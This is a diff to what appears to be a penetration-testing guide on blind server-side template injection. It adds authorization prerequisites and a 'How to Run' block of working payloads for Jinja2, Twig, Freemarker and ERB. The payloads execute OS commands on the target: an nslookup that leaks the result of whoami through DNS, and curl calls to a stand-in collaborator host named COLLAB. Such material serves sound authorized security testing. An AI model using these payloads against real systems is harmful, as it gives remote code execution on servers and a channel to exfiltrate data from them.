@@ -14,6 +14,36 @@ Use when the target has any endpoint that renders user-controlled input through 
 
 **Triggering contexts:** email templates (order confirmations, password resets, welcome emails), PDF/report generators, CMS preview features (page builder previews, theme editors), error pages that reflect user input, profile bio/name/description fields rendered by server-side templates, URL path parameters reflected in templates, and inline translation strings with interpolation.
 
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Jinja2 — exfil via DNS
+{{lipsum.__globals__.os.popen('nslookup $(whoami).COLLAB').read()}}
+
+# Twig — exfil via HTTP
+{{_self.env.registerUndefinedFilterCallback("system")}}
+{{_self.env.getFilter("curl http://COLLAB/blind-ssti")}}
+
+# Freemarker — exfil via URL
+${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(
+  "".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),
+  "curl http://COLLAB/blind-fm")}
+
+# ERB — exfil via open3
+<%= Open3.popen3('curl http://COLLAB/erb-blind').read %>
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Quick Reference
 
 ```bash
